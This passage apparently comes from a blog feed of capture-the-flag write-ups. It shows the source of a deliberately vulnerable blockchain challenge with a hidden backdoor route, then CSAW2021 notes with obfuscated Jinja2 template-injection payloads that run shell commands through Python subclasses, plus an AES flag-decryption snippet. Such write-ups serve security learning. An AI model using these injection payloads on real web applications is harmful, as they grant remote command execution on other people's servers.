punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            utxo<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_utxo<span class="token punctuation">(</span>utxo<span class="token punctuation">)</span>        tot_output <span class="token operator">=</span> sum<span class="token punctuation">(</span><span class="token punctuation">[</span>utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span> <span class="token keyword">for</span> utxo <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> type<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"type of input utxo ids in tx should be array"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> type<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"type of input utxo signatures in tx should be array"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> len<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"lengths of arrays of ids and signatures of input utxos should be the same"</span><span class="token punctuation">)</span>        tot_input <span class="token operator">=</span> <span class="token number">0</span>        tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">if</span> type<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> type<span class="token punctuation">(</span>u<span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">else</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> utxo_id<span class="token punctuation">,</span> signature <span class="token keyword">in</span> zip<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tx<span class="token punctuation">[</span><span class="token string">'signature'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> type<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of id of input utxo"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> utxo_id <span class="token operator">not</span> <span class="token keyword">in</span> utxos<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"invalid id of input utxo. Input utxo({}) does not exist or it has been consumed."</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span><span class="token punctuation">)</span>            utxo <span class="token operator">=</span> utxos<span class="token punctuation">[</span>utxo_id<span class="token punctuation">]</span>            <span class="token keyword">if</span> type<span class="token punctuation">(</span>signature<span class="token punctuation">)</span> <span class="token operator">!=</span> type<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"unknown type of signature of input utxo"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> verify_utxo_signature<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> utxo_id<span class="token punctuation">,</span> signature<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Signature of input utxo is not valid. You are not the owner of this input utxo({})!"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>utxo_id<span class="token punctuation">)</span><span class="token punctuation">)</span>            tot_input <span class="token operator">+=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>            <span class="token keyword">del</span> utxos<span class="token punctuation">[</span>utxo_id<span class="token punctuation">]</span>        <span class="token keyword">if</span> tot_output <span class="token operator">></span> tot_input<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"You don't have enough amount of DDCoins in the input utxo! {}/{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>tot_input<span class="token punctuation">,</span> tot_output<span class="token punctuation">)</span><span class="token punctuation">)</span>        tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> hash_tx<span class="token punctuation">(</span>tx<span class="token punctuation">)</span>    block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'prev'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'nonce'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> block<span class="token punctuation">[</span><span class="token string">'transactions'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    block_hash <span class="token operator">=</span> int<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> block_hash <span class="token operator">></span> difficulty<span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Please provide a valid Proof-of-Work'</span><span class="token punctuation">)</span>    block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">=</span> tail<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'The blockchain is too long. Use ./reset to reset the blockchain'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span> <span class="token keyword">in</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'A same block is already in the blockchain'</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> block    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'blocks'</span> <span class="token operator">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        <span class="token comment" spellcheck="true"># First, the bank issued some DDCoins ...</span>        total_currency_issued <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>bank_address<span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>        genesis_transaction <span class="token operator">=</span> create_tx<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>total_currency_issued<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># create DDCoins from nothing</span>        genesis_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>EMPTY_HASH<span class="token punctuation">,</span> <span class="token string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>genesis_transaction<span class="token punctuation">]</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span> <span class="token operator">=</span> genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span>        genesis_block<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> genesis_block        <span class="token comment" spellcheck="true"># Then, the bank was hacked by the hacker ...</span>        handout <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>hacker_address<span class="token punctuation">,</span> <span class="token number">999999</span><span class="token punctuation">)</span>        reserved <span class="token operator">=</span> create_output_utxo<span class="token punctuation">(</span>bank_address<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        transferred <span class="token operator">=</span> create_tx<span class="token punctuation">(</span><span class="token punctuation">[</span>total_currency_issued<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>handout<span class="token punctuation">,</span> reserved<span class="token punctuation">]</span><span class="token punctuation">,</span> bank_privkey<span class="token punctuation">)</span>        second_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>genesis_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'HAHA, I AM THE BANK NOW!'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>        append_block<span class="token punctuation">(</span>second_block<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Can you buy 2 diamonds using all DDCoins?</span>        third_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>second_block<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'a empty block'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        append_block<span class="token punctuation">(</span>third_block<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_balance_of_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    init<span class="token punctuation">(</span><span class="token punctuation">)</span>    tail <span class="token operator">=</span> find_blockchain_tail<span class="token punctuation">(</span><span class="token punctuation">)</span>    utxos <span class="token operator">=</span> calculate_utxo<span class="token punctuation">(</span>tail<span class="token punctuation">)</span>    <span class="token keyword">return</span> calculate_balance<span class="token punctuation">(</span>utxos<span class="token punctuation">)</span><span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">homepage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    announcement <span class="token operator">=</span> <span class="token string">'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '</span>    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> _ <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>    genesis_block_info <span class="token operator">=</span> <span class="token string">'hash of genesis block: '</span> <span class="token operator">+</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span>    addr_info <span class="token operator">=</span> <span class="token string">'the bank\'s addr: '</span> <span class="token operator">+</span> bank_address <span class="token operator">+</span> <span class="token string">', the hacker\'s addr: '</span> <span class="token operator">+</span> hacker_address <span class="token operator">+</span> <span class="token string">', the shop\'s addr: '</span> <span class="token operator">+</span> shop_address    balance_info <span class="token operator">=</span> <span class="token string">'Balance of all addresses: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>balance<span class="token punctuation">)</span>    utxo_info <span class="token operator">=</span> <span class="token string">'All utxos: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>utxos<span class="token punctuation">)</span>    blockchain_info <span class="token operator">=</span> <span class="token string">'Blockchain Explorer: '</span> <span class="token operator">+</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    view_source_code_link <span class="token operator">=</span> <span class="token string">"&lt;a href='source_code'>View source code&lt;/a>"</span>    <span class="token keyword">return</span> announcement<span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">'&lt;br />&lt;br />\r\n\r\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>view_source_code_link<span class="token punctuation">,</span> genesis_block_info<span class="token punctuation">,</span> addr_info<span class="token punctuation">,</span> balance_info<span class="token punctuation">,</span> utxo_info<span class="token punctuation">,</span> blockchain_info<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    init<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token keyword">return</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'To get the flag, you should buy 2 diamonds from the shop. You have {} diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> shop_address<span class="token keyword">def</span> <span class="token function">find_enough_utxos</span><span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    collected <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> utxo <span class="token keyword">in</span> utxos<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> utxo<span class="token punctuation">[</span><span class="token string">'addr'</span><span class="token punctuation">]</span> <span class="token operator">==</span> addr_from<span class="token punctuation">:</span>            amount <span class="token operator">-=</span> utxo<span class="token punctuation">[</span><span class="token string">'amount'</span><span class="token punctuation">]</span>            collected<span class="token punctuation">.</span>append<span class="token punctuation">(</span>utxo<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> amount <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> collected<span class="token punctuation">,</span> <span class="token operator">-</span>amount    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'no enough DDCoins in '</span> <span class="token operator">+</span> addr_from<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span><span class="token punctuation">:</span>    input_utxo_ids<span class="token punctuation">,</span> the_change <span class="token operator">=</span> find_enough_utxos<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> addr_from<span class="token punctuation">,</span> amount<span class="token punctuation">)</span>    outputs <span class="token operator">=</span> <span class="token punctuation">[</span>create_output_utxo<span class="token punctuation">(</span>addr_to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> the_change <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        outputs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>create_output_utxo<span class="token punctuation">(</span>addr_from<span class="token punctuation">,</span> the_change<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> create_tx<span class="token punctuation">(</span>input_utxo_ids<span class="token punctuation">,</span> outputs<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free_ddcoin</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token string">'The bank has no money now.'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        address <span class="token operator">=</span> str<span class="token punctuation">(</span>address<span class="token punctuation">)</span>        addr_to_pubkey<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># to check if it is a valid address</span>        transferred <span class="token operator">=</span> transfer<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> bank_address<span class="token punctuation">,</span> address<span class="token punctuation">,</span> balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span><span class="token punctuation">,</span> bank_privkey<span class="token punctuation">)</span>        new_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>tail<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'b@cKd00R tr1993ReD'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>        append_block<span class="token punctuation">(</span>new_block<span class="token punctuation">)</span>        <span class="token keyword">return</span> str<span class="token punctuation">(</span>balance<span class="token punctuation">[</span>bank_address<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' DDCoins are successfully sent to '</span> <span class="token operator">+</span> address    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'ERROR: '</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>DIFFICULTY <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token string">'00000'</span> <span class="token operator">+</span> <span class="token string">'f'</span> <span class="token operator">*</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/create_transaction'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_tx_and_check_shop_balance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    init<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        block <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        append_block<span class="token punctuation">(</span>block<span class="token punctuation">,</span> DIFFICULTY<span class="token punctuation">)</span>        msg <span class="token operator">=</span> <span class="token string">'transaction finished.'</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>    balance<span class="token punctuation">,</span> utxos<span class="token punctuation">,</span> tail <span class="token operator">=</span> get_balance_of_all<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> balance<span class="token punctuation">[</span>shop_address<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1000000</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># when 1000000 DDCoins are received, the shop will give you a diamond</span>        session<span class="token punctuation">[</span><span class="token string">'your_diamonds'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># and immediately the shop will store the money somewhere safe.</span>        transferred <span class="token operator">=</span> transfer<span class="token punctuation">(</span>utxos<span class="token punctuation">,</span> shop_address<span class="token punctuation">,</span> shop_wallet_address<span class="token punctuation">,</span> balance<span class="token punctuation">[</span>shop_address<span class="token punctuation">]</span><span class="token punctuation">,</span> shop_privkey<span class="token punctuation">)</span>        new_block <span class="token operator">=</span> create_block<span class="token punctuation">(</span>tail<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'save the DDCoins in a cold wallet'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>transferred<span class="token punctuation">]</span><span class="token punctuation">)</span>        append_block<span class="token punctuation">(</span>new_block<span class="token punctuation">)</span>        msg <span class="token operator">+=</span> <span class="token string">' You receive a diamond.'</span>    <span class="token keyword">return</span> msg<span class="token comment" spellcheck="true"># if you mess up the blockchain, use this to reset the blockchain.</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/reset'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reset_blockchain</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'blocks'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span> <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token string">'genesis_block_hash'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span> <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'genesis_block_hash'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">'reset.'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/source_code'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_source_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    source <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'serve.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>    html <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>        html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>    source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> html<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> åŒºå—é“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAW2021</title>
      <link href="2021/10/30/csaw2021/"/>
      <url>2021/10/30/csaw2021/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/30/csaw2021/1.png" alt="image-20211030195537198"></p><h1 id="NinjaðŸ¥·"><a href="#NinjaðŸ¥·" class="headerlink" title="NinjaðŸ¥·"></a>NinjaðŸ¥·</h1><p>ssti-&gt;payload</p><pre><code>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5f'+'b'+'ase\x5f\x5f')|attr('x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(258)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()}}</code></pre><pre><code>{{''[request.args.a][request.args.b][2][request.args.c]()[258]('cat+flag.txt',shell%3dTrue,stdout%3d-1).communicate()[0].strip()}}&amp;a=__class__&amp;b=__mro__&amp;c=__subclasses__</code></pre><pre><code>{{()|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5f\x62\x61\x73\x65\x5f\x5f%27)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(258)(%27cat+flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(0)|attr(%27decode%27)(%27utf-8%27)}}</code></pre><p>flag{m0mmy_s33_1m_4_r34l_n1nj4}</p><h1 id="Gatekeeping"><a href="#Gatekeeping" class="headerlink" title="Gatekeeping"></a>Gatekeeping</h1><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">import</span> binascii<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'dist/flag.txt.enc'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    key <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token string">'b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    iv <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">]</span>    data <span class="token operator">=</span> data<span class="token punctuation">[</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">:</span><span class="token punctuation">]</span>    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CFB<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>flag{gunicorn_probably_should_not_do_that}</p><h1 id="No-pass-needed"><a href="#No-pass-needed" class="headerlink" 